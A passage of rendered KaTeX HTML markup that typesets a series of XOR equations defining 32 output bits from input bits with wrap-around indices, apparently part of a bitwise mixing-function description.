mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.690000000000019em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.2500000000000213em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-0.8100000000000237em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:0.6299999999999736em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:2.0699999999999714em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:3.509999999999969em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:4.949999999999966em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:6.389999999999968em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:7.829999999999972em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:9.269999999999976em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:10.709999999999981em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:12.149999999999986em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span 